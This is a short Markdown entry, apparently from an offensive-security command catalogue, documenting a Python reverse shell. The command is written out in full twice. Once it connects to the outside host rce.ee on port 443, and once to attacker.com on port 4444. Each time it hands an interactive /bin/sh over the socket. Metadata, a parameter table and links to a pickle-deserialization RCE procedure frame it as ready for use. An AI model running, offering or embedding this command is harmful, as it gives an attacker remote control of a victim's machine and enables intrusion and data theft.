---
data: >-
  python -c 'import
  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("rce.ee",443));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
tags:
  - python
  - reverse-shell
type: command
executor: bash
platforms:
  - Linux
id: 49ae800b-2567-48cf-97ea-a31d603b0835
created_at: '2025-12-13T09:00:28.001Z'
updated_at: '2025-12-13T09:00:28.001Z'
verified: false
validated: true
submitted: true
---
# Python Reverse Shell

## Command

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("rce.ee",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Description

Establishes a reverse shell connection to a remote host, allowing interactive command execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `host` | Remote host to connect to (e.g., rce.ee) | Yes |
| `port` | Port to connect to (e.g., 443) | Yes |

## Examples

### Basic Usage

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Expected Output

An interactive reverse shell session on the listener.

## Related

- [[procedures/Exploit-Python-Pickle-Deserialization-for-RCE]]
- [[tools/Netcat]]
